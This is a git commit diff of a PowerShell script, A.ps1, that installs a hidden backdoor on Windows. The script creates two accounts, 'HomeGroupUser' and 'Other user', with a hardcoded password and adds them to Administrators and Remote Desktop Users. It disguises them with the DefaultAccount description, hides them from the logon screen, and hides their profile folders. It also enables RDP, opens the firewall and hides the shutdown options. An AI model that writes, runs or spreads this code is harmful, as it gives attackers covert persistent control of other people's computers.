cacada25be09055d2bfcbfa004f4c54327bd4165
al0nks1337 <al0nks1337@gmail.com>
2025-05-01 09:01:44 +0000

    Update A.ps1

--- A.ps1
+++ A.ps1
@@ -11,12 +11,11 @@ $rdpUsersSID = "S-1-5-32-555"
 $adminGroupName = (New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
 $rdpGroupName = (New-Object System.Security.Principal.SecurityIdentifier($rdpUsersSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
 
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+New-Item -ItemType Directory -Path $tempDir -Force > $null
 secedit /export /cfg $configFile > $null 2>&1
 
 $lines = [System.Collections.Generic.List[string]](Get-Content $configFile)
 $privRightsIndex = $lines.IndexOf("[Privilege Rights]")
-
 if ($privRightsIndex -eq -1) { exit }
 
 $shutdownIndex = ($lines | Select-String "^SeShutdownPrivilege").LineNumber
@@ -42,40 +41,60 @@ $lines | Set-Content $configFile -Encoding Unicode > $null 2>&1
 secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet > $null 2>&1
 Remove-Item $tempDir -Recurse -Force > $null 2>&1
 
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ShutdownWithoutLogon" -Value 0 -Type DWord > $null 2>&1
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutdown" -Name "Value" -Value 1 -Type DWord
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleep" -Name "Value" -Value 1 -Type DWord
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernate" -Name "Value" -Value 1 -Type DWord
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ShutdownWithoutLogon" -Value 0 -Type DWord > $null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutdown" -Name "Value" -Value 1 -Type DWord > $null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleep" -Name "Value" -Value 1 -Type DWord > $null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernate" -Name "Value" -Value 1 -Type DWord > $null
 
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 > $null 2>&1
-Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null 2>&1
-Set-Service -Name TermService -StartupType Automatic > $null 2>&1
-Start-Service TermService > $null 2>&1
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 > $null
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null
+Set-Service -Name TermService -StartupType Automatic > $null
+Start-Service TermService > $null
 
 $password = "Adm!n@93f"
 $userAccounts = @("HomeGroupUser", "Other user")
-$defaultAccount = Get-LocalUser -Name "DefaultAccount"
-$defaultAccountDescription = $defaultAccount.Description
-foreach ($user in $userAccounts) {
-    net user "$user" "$password" /add > $null 2>&1
-    net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
-    net user "$user" /expires:never > $null 2>&1
-    net user "$user" /active:yes > $null 2>&1
-    Set-LocalUser -Name "$user" -PasswordNeverExpires $true > $null 2>&1
 
-    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-    New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force | Out-Null
-}
+$defaultAccountDescription = "A user account managed by the system."
+try {
+    $defaultAccount = Get-LocalUser -Name "DefaultAccount" -ErrorAction Stop
+    $defaultAccountDescription = $defaultAccount.Description
+} catch {}
 
-$adminGroup = [ADSI]"WinNT://./$adminGroupName,group"
-$rdpGroup = [ADSI]"WinNT://./$rdpGroupName,group"
 foreach ($user in $userAccounts) {
     try {
-        Add-LocalGroupMember -Group $adminGroupName -Member $user -ErrorAction Stop | Out-Null
-    } catch {}
-    try {
-        Add-LocalGroupMember -Group $rdpGroupName -Member $user -ErrorAction Stop | Out-Null
+        $userExists = Get-LocalUser -Name "$user" -ErrorAction SilentlyContinue
+        if (-not $userExists) {
+            net user "$user" "$password" /add > $null 2>&1
+            net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
+            net user "$user" /expires:never > $null 2>&1
+            net user "$user" /active:yes > $null 2>&1
+        }
+
+        Set-LocalUser -Name "$user" -PasswordNeverExpires $true > $null 2>&1
+
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force > $null }
+        New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force > $null
+
+        $isDomainUser = ($user -like "*\*")
+        $userForGroup = if ($isDomainUser) { $user } else { "$env:COMPUTERNAME\$user" }
+
+        cmd /c "net localgroup `"$adminGroupName`" `"$userForGroup`" /add" > $null 2>&1
+        cmd /c "net localgroup `"$rdpGroupName`" `"$userForGroup`" /add" > $null 2>&1
+
+        $userFolder = "$env:SystemDrive\Users\$user"
+        if (-not (Test-Path $userFolder)) {
+            try {
+                Copy-Item "$env:SystemDrive\Users\Default" $userFolder -Recurse -Force -ErrorAction Stop
+                attrib +h "$userFolder"
+            } catch {
+                New-Item -Path $userFolder -ItemType Directory -Force > $null
+                attrib +h "$userFolder"
+            }
+        } else {
+            attrib +h "$userFolder"
+        }
+
     } catch {}
 }
 
